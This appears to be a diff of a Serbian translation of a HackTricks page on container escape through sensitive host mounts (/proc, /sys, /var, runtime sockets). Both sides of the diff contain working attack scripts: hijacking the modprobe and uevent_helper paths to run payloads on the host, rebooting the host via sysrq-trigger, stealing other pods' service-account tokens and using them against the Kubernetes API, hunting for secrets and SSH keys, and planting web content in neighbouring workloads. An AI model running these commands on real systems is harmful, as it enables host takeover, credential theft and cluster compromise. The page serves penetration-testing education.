@@ -4,15 +4,15 @@
 
 ## Pregled
 
-Host mounts su jedna od najvažnijih praktičnih površina za container-escape jer često urušavaju pažljivo izolovan prikaz procesa i ponovo otkrivaju direktan pristup host resursima. Opasni slučajevi nisu ograničeni na `/`. Bind mountovi `/proc`, `/sys`, `/var`, runtime soketa, stanja kojima upravlja kubelet, ili putanja vezanih za uređaje mogu otkriti kontrole kernela, kredencijale, fajl sisteme susednih kontejnera i runtime interfejse za upravljanje.
+Host mountovi su jedna od najvažnijih praktičnih container-escape površina zato što često urušavaju pažljivo izolovan prikaz procesa i vraćaju direktnu vidljivost host resursa. Opasni slučajevi nisu ograničeni na `/`. Bind mountovi `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state ili putevi vezani za uređaje mogu izložiti kernel kontrole, kredencijale, fajlsisteme susednih containera i interfejse za upravljanje runtime-om.
 
-Ova stranica postoji odvojeno od pojedinačnih stranica o zaštiti jer se model zloupotrebe proteže kroz više oblasti. Host mount koji dozvoljava upis je opasan delimično zbog mount namespaces, delimično zbog user namespaces, delimično zbog AppArmor ili SELinux pokrivenosti, i delimično zbog toga koja je tačna host putanja izložena. Posmatranje toga kao posebne teme olakšava razumevanje attack surface-a.
+Ova stranica postoji odvojeno od pojedinačnih stranica sa zaštitama zato što je model zloupotrebe presečan. Writable host mount je opasan delimično zbog mount namespace-ova, delimično zbog user namespace-ova, delimično zbog AppArmor ili SELinux pokrivenosti, i delimično zbog tačno kog host puta je izložen. Tretiranje kao posebne teme olakšava rasuđivanje o površini napada.
 
-## `/proc` izlaganje
+## `/proc` Izloženost
 
-procfs sadrži i obične informacije o procesu i kernel interfejse velikog uticaja za kontrolu. Bind mount kao `-v /proc:/host/proc` ili prikaz u kontejneru koji izlaže neočekivane writable proc unose može stoga dovesti do otkrivanja informacija, denial of service, ili direktnog izvršavanja koda na hostu.
+procfs sadrži i obične informacije o procesima i visokorizične kernel kontrolne interfejse. Bind mount kao `-v /proc:/host/proc` ili prikaz containera koji otkriva neočekivane upisive proc unose stoga može dovesti do otkrivanja informacija, denial of service, ili direktnog izvršavanja koda na hostu.
 
-High-value procfs paths include:
+Visoko-vredne procfs putanje uključuju:
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
@@ -31,7 +31,7 @@ High-value procfs paths include:
 
 ### Zloupotreba
 
-Počnite proverom koji su procfs unosi visoke vrednosti vidljivi ili dozvoljavaju upis:
+Počnite proverom koji su visoko-vredni procfs unosi vidljivi ili upisivi:
 ```bash
 for p in \
 /proc/sys/kernel/core_pattern \
@@ -46,47 +46,47 @@ for p in \
 [ -e "$p" ] && ls -l "$p"
 done
 ```
-Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu kada su upisive. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su snažni izvori za izviđanje pri eksploataciji kernela. `sched_debug` i `mountinfo` otkrivaju procesni, cgroup i filesystem kontekst koji može pomoći pri rekonstrukciji host layout-a iz kontejnera.
+Ove putanje su zanimljive iz različitih razloga. `core_pattern`, `modprobe`, i `binfmt_misc` mogu postati putanje za izvršavanje koda na hostu ako su upisive. `kallsyms`, `kmsg`, `kcore`, i `config.gz` su snažni izvori informacija za kernel exploitation. `sched_debug` i `mountinfo` otkrivaju kontekst procesa, cgroup i fajl-sistema koji mogu pomoći da se rekonstruše raspored hosta iznutra u containeru.
 
-Praktična vrednost svake putanje se razlikuje, i tretirati ih sve kao da imaju isti uticaj otežava trijažu:
+Praktična vrednost svake putanje je različita, i tretiranje svih kao da imaju isti uticaj otežava triage:
 
 - `/proc/sys/kernel/core_pattern`
-  Ako je upisiva, ovo je jedna od putanja u procfs-u sa najvećim uticajem zato što kernel izvršava pipe handler nakon pada. Kontejner koji može usmeriti `core_pattern` na payload smešten u svom overlay-u ili u montiranoj host putanji često može dobiti izvršavanje koda na hostu. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
+Ako je upisiv, ovo je jedna od putanja u procfs-u sa najvećim uticajem jer kernel izvršava pipe handler nakon pada. Container koji može usmeriti `core_pattern` na payload smešten u svom overlay-u ili u mountovanoj host putanji često može dobiti host code execution. Pogledajte takođe [read-only-paths.md](protections/read-only-paths.md) za poseban primer.
 - `/proc/sys/kernel/modprobe`
-  Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pokrene logiku učitavanja modula. Ako je upisiva iz kontejnera i interpretira se u host kontekstu, može postati još jedan primitiv za izvršavanje koda na hostu. Posebno je zanimljiva kada se kombinuje sa načinom za okidanje helper putanje.
+Ova putanja kontroliše userspace helper koji kernel koristi kada treba da pozove logiku za učitavanje modula. Ako je upisiva iz container-a i interpretirana u kontekstu hosta, može postati još jedan primitiv za host code execution. Posebno je interesantna kada se kombinuje sa načinom da se trigger-uje helper putanja.
 - `/proc/sys/vm/panic_on_oom`
-  Obično nije čist escape primitiv, ali može pretvoriti pritisak memorije u host-wide denial of service tako što će OOM uslove pretvoriti u kernel panic ponašanje.
+Obično nije čist primitiv za eskap, ali može pretvoriti memorijski pritisak u host-wide denial of service tako što OOM uslove pretvara u kernel panic ponašanje.
 - `/proc/sys/fs/binfmt_misc`
-  Ako je registracioni interfejs upisiv, napadač može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u host kontekstu kada se pokrene odgovarajući fajl.
+Ako je interfejs za registraciju upisiv, napadač može registrovati handler za izabranu magic vrednost i dobiti izvršavanje u kontekstu hosta kada se izvrši odgovarajući fajl.
 - `/proc/config.gz`
-  Koristan za triage kernel exploita. Pomaže odrediti koji podsistemi, mitigacije i opcionе kernel funkcije su omogućene bez potrebe za metapodacima paketa na hostu.
+Koristan za triage kernel exploit-a. Pomaže odrediti koja podsistema, mitigacije i opciona kernel svojstva su omogućena bez potrebe za host package metadata.
 - `/proc/sysrq-trigger`
-  Pretežno putanja za denial-of-service, ali veoma ozbiljna. Može odmah restartovati, izazvati kernel panic ili na drugi način odmah poremetiti host.
+Uglavnom putanja za denial-of-service, ali veoma ozbiljna. Može reboot-ovati, izazvati panic, ili na drugi način odmah poremetiti host.
 - `/proc/kmsg`
-  Otkriva poruke iz kernel ring buffera. Korisno za host fingerprinting, analizu crash-a, i u nekim okruženjima za leaking informacija korisnih za kernel exploitation.
+Otkriva poruke kernel ring buffera. Koristan za host fingerprinting, analizu crash-a, i u nekim okruženjima za leaking informacija korisnih za kernel exploitation.
 - `/proc/kallsyms`
-  Vredno kada je čitljivo jer otkriva izvezene informacije o kernel simbolima i može pomoći u obaranju pretpostavki o address randomization tokom razvoja kernel exploita.
+Vredan kada je čitljiv jer otkriva exported kernel simbol informacije i može pomoći da se pobiju pretpostavke o address randomization tokom razvoja kernel exploit-a.
 - `/proc/[pid]/mem`
-  Ovo je direktan interfejs za memoriju procesa. Ako je ciljni proces dostupan uz neophodne ptrace-style uslove, može omogućiti čitanje ili menjanje memorije drugog procesa. Realističan uticaj uveliko zavisi od privilegija, `hidepid`, Yama i ptrace restrikcija, tako da je moćna ali uslovna putanja.
+Ovo je direktan proces-memorija interfejs. Ako je cilj proces dostupan uz neophodne ptrace-style uslove, može dozvoliti čitanje ili modifikovanje memorije drugog procesa. Realističan uticaj uveliko zavisi od kredencijala, `hidepid`, Yama i ptrace ograničenja, tako da je to moćna ali uslovna putanja.
 - `/proc/kcore`
-  Otkriva prikaz sistema memorije sličan core image-u. Fajl je ogroman i nezgodan za korišćenje, ali ako je čitljiv u značajnoj meri ukazuje na loše izložen interfejs memorije hosta.
-- `/proc/kmem` and `/proc/mem`
-  Istorijski su to interfejsi sirove memorije sa visokim uticajem. Na mnogim modernim sistemima su onemogućeni ili strogo ograničeni, ali ako postoje i mogu se koristiti treba ih smatrati kritičnim nalazima.
+Izlaže view sistema memorije u stilu core-image. Fajl je ogroman i nezgodan za korišćenje, ali ako je čitljiv u značajnoj meri, ukazuje na loše izloženu površinu host memorije.
+- `/proc/kmem` i `/proc/mem`
+Istorijski visoko-impaktni raw memory interfejsi. Na mnogim modernim sistemima su onemogućeni ili jako ograničeni, ali ako su prisutni i upotrebljivi treba ih tretirati kao kritične nalaze.
 - `/proc/sched_debug`
-  Leaks scheduling i task information koje mogu otkriti identitete procesa na hostu čak i kada drugi pregledi procesa izgledaju čišći nego što se očekivalo.
+Leaks informacije o rasporedu i task-ovima koje mogu otkriti identitete host procesa čak i kada drugi pogledi na procese izgledaju čišće nego što se očekivalo.
 - `/proc/[pid]/mountinfo`
-  Izuzetno korisno za rekonstruisanje gde se kontejner zaista nalazi na hostu, koje putanje su overlay-backed, i da li writable mount odgovara sadržaju na hostu ili samo sloju kontejnera.
+Izuzetno koristan za rekonstrukciju gde se container zaista nalazi na hostu, koje putanje su overlay-backed, i da li writable mount odgovara sadržaju hosta ili samo container layer-u.
 
-Ako su `/proc/[pid]/mountinfo` ili detalji overlay-a čitljivi, koristite ih da rekonstrušete host path fajl sistema kontejnera:
+Ako su `/proc/[pid]/mountinfo` ili overlay detalji čitljivi, iskoristite ih da povratite host-putanju filesystema containera:
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
-Ove komande su korisne zato što mnogi trikovi za izvršavanje na hostu zahtevaju prevođenje putanje unutar kontejnera u odgovarajuću putanju iz perspektive hosta.
+Ove komande su korisne zato što mnogi trikovi za izvršavanje na hostu zahtevaju da se putanja iz containera prevede u odgovarajuću putanju iz perspektive hosta.
 
 ### Potpun primer: `modprobe` Helper Path Abuse
 
-Ako je `/proc/sys/kernel/modprobe` writable iz kontejnera i helper path se tumači u kontekstu hosta, može biti preusmerena na napadačev payload:
+Ako je `/proc/sys/kernel/modprobe` upisiv iz containera i helper path se interpretira u kontekstu hosta, može biti preusmeren na payload koji kontroliše napadač:
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
 host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
@@ -98,31 +98,29 @@ chmod +x /tmp/modprobe-payload
 echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
 cat /proc/sys/kernel/modprobe
 ```
-Tačan okidač zavisi od mete i ponašanja kernela, ali važna poenta je da pomoćna putanja koja dozvoljava pisanje može preusmeriti budući kernel helper poziv na sadržaj host-path koji kontroliše napadač.
+Tačan okidač zavisi od cilja i ponašanja kernela, ali bitna stvar je da writable helper path može preusmeriti buduću kernel helper invocation na host-path sadržaj koji je pod kontrolom napadača.
 
-### Potpun primer: Kernel Recon sa `kallsyms`, `kmsg` i `config.gz`
+### Kompletan primer: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`
 
-Ako je cilj procena eksploatabilnosti, a ne neposredno bekstvo:
+Ako je cilj procena mogućnosti iskorišćavanja umesto trenutnog bekstva:
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
 dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
-Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju interesantno stanje i koje su kernel funkcije ili mitigacije kompajlirane. Uticaj obično nije direktno escape, ali može znatno skratiti trijažu kernel ranjivosti.
+Ove komande pomažu da se utvrdi da li su korisne informacije o simbolima vidljive, da li nedavne kernel poruke otkrivaju interesantno stanje i koje su kernel funkcije ili mitigacije kompajlirane. Učinak obično nije direktan escape, ali može znatno skratiti kernel-vulnerability triage.
 
-### Potpuni primer: SysRq - ponovno pokretanje hosta
-
-Ako je `/proc/sysrq-trigger` upisiv i dostupan iz prikaza hosta:
+### Puni primer: SysRq — ponovno pokretanje hosta
 ```bash
 echo b > /proc/sysrq-trigger
 ```
-Efekat je trenutno ponovno pokretanje hosta. Ovo nije suptilan primer, ali jasno pokazuje da izlaganje procfs može biti daleko ozbiljnije od pukog otkrivanja informacija.
+Efekat je neposredan host reboot. Ovo nije suptilan primer, ali jasno pokazuje da procfs izloženost može biti mnogo ozbiljnija od otkrivanja informacija.
 
 ## `/sys` izloženost
 
-sysfs izlaže velike količine kernel i device stanja. Neki sysfs putevi su uglavnom korisni za fingerprinting, dok drugi mogu uticati na helper execution, ponašanje uređaja, konfiguraciju security-module, ili na firmware state.
+sysfs izlaže velike količine stanja kernela i uređaja. Neke sysfs putanje su uglavnom korisne za fingerprinting, dok druge mogu uticati na izvršenje helper-a, ponašanje uređaja, konfiguraciju security-module-a, ili firmware stanje.
 
-Visoko-vredne sysfs putanje uključuju:
+High-value sysfs paths include:
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -132,7 +130,7 @@ Visoko-vredne sysfs putanje uključuju:
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na ponašanje thermal-management i samim tim stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` može leak crash-dump i kernel-layout informacije koje pomažu u low-level host fingerprintingu. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, pa neočekivan pristup tamo može expose-ovati ili izmeniti MAC-related stanje. EFI variable putanje mogu uticati na firmware-backed boot postavke, čineći ih mnogo ozbiljnijim od običnih konfig fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan jer je namerno developer-oriented interfejs sa znatno manje bezbednosnih očekivanja nego hardened production-facing kernel APIs.
+Ove putanje su važne iz različitih razloga. `/sys/class/thermal` može uticati na thermal-management ponašanje i samim tim stabilnost hosta u loše izloženim okruženjima. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` je `securityfs` interfejs koji koriste Linux Security Modules, tako da neočekivan pristup tamo može otkriti ili izmeniti MAC-related stanje. EFI variable paths mogu uticati na firmware-backed boot podešavanja, čineći ih mnogo ozbiljnijim od običnih konfiguracionih fajlova. `debugfs` pod `/sys/kernel/debug` je posebno opasan zato što je namerno developer-oriented interfejs sa znatno manje očekivanja u pogledu bezbednosti nego ojačani production-facing kernel APIs.
 
 Korisne komande za pregled ovih putanja su:
 ```bash
@@ -142,17 +140,17 @@ find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
 find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
-Šta čini ove komande zanimljivim:
+What makes those commands interesting:
 
-- `/sys/kernel/security` može otkriti da li je AppArmor, SELinux, ili neki drugi LSM interfejs vidljiv na način koji je trebalo da ostane samo na hostu.
-- `/sys/kernel/debug` je često najuznemirujuće otkriće u ovoj grupi. Ako je `debugfs` montiran i čitljiv ili upisiv, očekujte široku površinu okrenutu ka kernelu čiji tačan rizik zavisi od omogućених debug čvorova.
-- Izlaganje EFI promenljivih je ređe, ali ako postoji, ima veliki uticaj jer pogađa podešavanja podržana firmverom umesto običnih runtime datoteka.
-- `/sys/class/thermal` je pre svega relevantan za stabilnost hosta i interakciju sa hardverom, a ne za elegantan shell-style escape.
-- `/sys/kernel/vmcoreinfo` je uglavnom izvor za host-fingerprinting i crash-analysis, koristan za razumevanje niskonivog kernel stanja.
+- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
+- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
+- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
+- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
+- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.
 
 ### Potpun primer: `uevent_helper`
 
-Ako je `/sys/kernel/uevent_helper` upisiv, kernel može izvršiti pomoćni program koji kontroliše napadač kada se pokrene `uevent`:
+Ako je `/sys/kernel/uevent_helper` upisiv, kernel može izvršiti helper pod kontrolom napadača kada se pokrene `uevent`:
 ```bash
 cat <<'EOF' > /evil-helper
 #!/bin/sh
@@ -164,50 +162,50 @@ echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 echo change > /sys/class/mem/null/uevent
 cat /output
 ```
-Razlog zbog kojeg ovo funkcioniše je što se pomoćna putanja tumači iz perspektive hosta. Kada se aktivira, pomoćni program se izvršava u kontekstu hosta umesto unutar trenutnog kontejnera.
+Razlog zbog kojeg ovo funkcioniše je što se putanja pomoćnika interpretira iz ugla hosta. Kada se pokrene, pomoćnik se izvršava u kontekstu hosta, a ne unutar trenutnog containera.
 
 ## `/var` Izloženost
 
-Montiranje hostovog `/var` u kontejner se često potcenjuje zato što ne izgleda tako dramatično kao montiranje `/`. U praksi može biti dovoljno da se pristupi runtime sockets, direktorijumima snapshot-a kontejnera, kubelet-managed pod volumes, projected service-account tokens i fajl-sistemima susednih aplikacija. Na modernim čvorovima, `/var` je često mesto gde se zaista nalazi najinteresantnije operativno stanje kontejnera.
+Mountovanje hostovog `/var` u container se često potcenjuje jer ne deluje tako dramatično kao mountovanje `/`. U praksi može biti dovoljno da se pristupi runtime socket-ovima, direktorijumima snapshot‑a containera, kubelet-managed pod volumes, projected service-account tokens i fajl sistemima susednih aplikacija. Na modernim čvorovima, `/var` je često mesto gde zapravo živi najveći deo operativno interesantnog stanja containera.
 
-### Kubernetes Primer
+### Kubernetes primer
 
-Pod sa `hostPath: /var` često može pročitati projektovane tokene drugih podova i sadržaj overlay snapshot-a:
+Pod sa `hostPath: /var` često može da pročita projected token-e drugih podova i sadržaj overlay snapshot-a:
 ```bash
 find /host-var/ -type f -iname '*.env*' 2>/dev/null
 find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
-Ove komande su korisne jer odgovaraju na pitanje da li mount izlaže samo dosadne podatke aplikacije ili visokorizične akreditive klastera. Čitljiv service-account token može odmah da pretvori local code execution u pristup Kubernetes API.
+Ove komande su korisne zato što odgovaraju na pitanje da li mount izlaže samo beznačajne podatke aplikacije ili kritične akreditive klastera. Čitljiv service-account token može odmah pretvoriti lokalno izvršavanje koda u pristup Kubernetes API.
 
-Ako token postoji, proverite šta može da dosegne umesto da se zaustavite samo na otkriću tokena:
+Ako token postoji, proverite šta može da dosegne umesto da se zaustavite na otkriću tokena:
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
-Uticaj ovde može biti znatno veći od pristupa lokalnom čvoru. Token sa širokim RBAC-om može montirani `/var` pretvoriti u kompromis čitavog klastera.
+Uticaj ovde može biti mnogo veći od pristupa lokalnom čvoru. Token sa širokim RBAC može pretvoriti montirani `/var` u kompromitovanje čitavog klastera.
 
-### Primer za Docker i containerd
+### Docker i containerd — primer
 
-Na Docker hostovima relevantni podaci se često nalaze pod `/var/lib/docker`, dok se na Kubernetes čvorovima koji koriste containerd mogu nalaziti pod `/var/lib/containerd` ili u putanjama specifičnim za snapshotter:
+Na Docker hostovima relevantni podaci se često nalaze pod `/var/lib/docker`, dok na Kubernetes čvorovima koji koriste containerd mogu biti pod `/var/lib/containerd` ili u snapshotter-specifičnim putanjama:
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
 find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
-Ako montirani `/var` izlaže upisiv sadržaj snapshot-a drugog workload-a, napadač može da izmeni fajlove aplikacije, postavi web sadržaj ili promeni skripte za pokretanje bez menjanja trenutne konfiguracije kontejnera.
+Ako montirani `/var` izlaže writable snapshot sadržaje drugog workload-a, napadač može izmeniti datoteke aplikacije, postaviti web sadržaj ili promeniti startup skripte bez diranja trenutne container konfiguracije.
 
-Konkretne ideje zloupotrebe kada se pronađe upisiv sadržaj snapshot-a:
+Konkretne ideje za zloupotrebu nakon pronalaska writable snapshot sadržaja:
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
 grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
 ```
-Ove komande su korisne jer prikazuju tri glavne kategorije uticaja montiranog `/var`: application tampering, secret recovery i lateral movement into neighboring workloads.
+Ove komande su korisne jer pokazuju tri glavne impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.
 
 ## Runtime Sockets
 
-Sensitive host mounts često uključuju runtime sockets umesto celih direktorijuma. One su toliko važne da zaslužuju eksplicitno ponavljanje ovde:
+Sensitive host mounts često uključuju runtime sockets umesto full directories. Runtime sockets su toliko važni da zaslužuju izričito ponavljanje ovde:
 ```text
 /run/containerd/containerd.sock
 /var/run/crio/crio.sock
@@ -216,7 +214,7 @@ Sensitive host mounts često uključuju runtime sockets umesto celih direktoriju
 /var/run/kubelet.sock
 /run/firecracker-containerd.sock
 ```
-Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije kada je jedan od ovih sockets mounted.
+Pogledajte [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) za kompletne tokove eksploatacije nakon što je jedan od ovih soketa montiran.
 
 Kao brz početni obrazac interakcije:
 ```bash
@@ -224,22 +222,22 @@ docker -H unix:///host/run/docker.sock version 2>/dev/null
 ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
 crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
 ```
-Ako jedno od ovih uspe, put od "mounted socket" do "start a more privileged sibling container" obično je znatno kraći nego bilo koji kernel breakout put.
+Ako jedan od ovih uspe, put od "mounted socket" do "start a more privileged sibling container" obično je mnogo kraći nego bilo koji put za kernel breakout.
 
-## CVE-ovi vezani za mount
+## Mount-Related CVEs
 
 Host mount-ovi takođe se preklapaju sa runtime ranjivostima. Važni nedavni primeri uključuju:
 
-- `CVE-2024-21626` u `runc`, gde leaked directory file descriptor može postaviti working directory na host filesystem.
-- `CVE-2024-23651` i `CVE-2024-23653` u BuildKit, gde OverlayFS copy-up races mogu proizvesti host-path writes tokom builds.
-- `CVE-2024-1753` u Buildah i Podman build flow-ovima, gde crafted bind mounts tokom build-a mogu izložiti `/` kao read-write.
-- `CVE-2024-40635` u containerd, gde velika `User` vrednost može overflow-ovati u ponašanje UID 0.
+- `CVE-2024-21626` u `runc`, gde leaked directory file descriptor može da postavi radni direktorijum na host filesystem.
+- `CVE-2024-23651` i `CVE-2024-23653` u BuildKit, gde OverlayFS copy-up races mogu da proizvedu host-path writes tokom build-ova.
+- `CVE-2024-1753` u Buildah i Podman build tokovima, gde crafted bind mounts tokom build-a mogu izložiti `/` read-write.
+- `CVE-2024-40635` u containerd, gde velika `User` vrednost može preći u ponašanje UID 0.
 
-Ovi CVE-ovi su važni ovde jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatora. Sam runtime takođe može da uvede mount-driven escape uslove.
+Ovi CVE-ovi su važni ovde jer pokazuju da rukovanje mount-ovima nije samo pitanje konfiguracije operatera. Sam runtime takođe može uvesti mount-driven escape uslove.
 
-## Provere
+## Checks
 
-Koristite ove komande da brzo pronađete mount izloženosti najvećeg rizika:
+Koristite ove komande da brzo pronađete mount izloženosti najveće vrednosti:
 ```bash
 mount
 find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
@@ -247,8 +245,7 @@ find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.s
 find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
 find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
-What is interesting here:
-
-- Root hosta, `/proc`, `/sys`, `/var` i runtime soketi su svi nalazi visokog prioriteta.
-- Upisivi proc/sys unosi često znače da mount izlaže host-globalne kernel kontrole umesto bezbednog prikaza kontejnera.
-- Montirane `/var` putanje zaslužuju pregled kredencijala i susednih workload-a, a ne samo pregled fajl sistema.
+- Host root, `/proc`, `/sys`, `/var`, i runtime sockets su nalazi visokog prioriteta.
+- Stavke u proc/sys koje se mogu upisati često znače da mount izlaže globalne kontrole kernela hosta, umesto bezbednog prikaza container-a.
+- Montirani `/var` putevi zaslužuju pregled kredencijala i susednih workload-ova, a ne samo reviziju sistema fajlova.
+{{#include ../../../banners/hacktricks-training.md}}
